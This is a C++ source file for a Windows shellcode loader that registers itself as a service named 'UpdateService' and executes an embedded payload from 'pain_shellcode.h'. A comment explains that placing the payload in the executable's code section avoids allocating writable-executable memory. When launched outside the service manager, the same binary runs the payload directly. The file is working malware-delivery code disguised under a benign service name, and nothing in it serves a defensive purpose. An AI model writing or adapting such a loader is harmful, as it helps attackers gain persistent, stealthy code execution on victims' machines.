#include <windows.h>
#include "pain_shellcode.h"

// PainSC::Data lives in .text (already r-x) - no VirtualAlloc/RWX needed.

#define SVC_NAME "UpdateService"

static SERVICE_STATUS        g_svc = {};
static SERVICE_STATUS_HANDLE g_hdl = NULL;

static void RunPain(void) {
    void (*sc)(void) = (void(*)(void))PainSC::Data;
    sc();
}

static void WINAPI SvcCtrlHandler(DWORD ctrl) {
    if (ctrl == SERVICE_CONTROL_STOP || ctrl == SERVICE_CONTROL_SHUTDOWN) {
        g_svc.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(g_hdl, &g_svc);
    }
}

static void WINAPI ServiceMain(DWORD, LPSTR*) {
    g_hdl = RegisterServiceCtrlHandlerA(SVC_NAME, SvcCtrlHandler);
    if (!g_hdl) return;

    g_svc.dwServiceType      = SERVICE_WIN32_OWN_PROCESS;
    g_svc.dwCurrentState     = SERVICE_RUNNING;
    g_svc.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    SetServiceStatus(g_hdl, &g_svc);

    RunPain();

    g_svc.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_hdl, &g_svc);
}

// WinMain: try to start as a Windows service first.
// If StartServiceCtrlDispatcher fails (e.g. run directly from cmd), fall through
// and execute shellcode inline - same binary works both as service and standalone exe.
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    SERVICE_TABLE_ENTRYA tbl[] = {
        { (LPSTR)SVC_NAME, ServiceMain },
        { NULL, NULL }
    };
    if (!StartServiceCtrlDispatcherA(tbl)) {
        RunPain();
    }
    return 0;
}
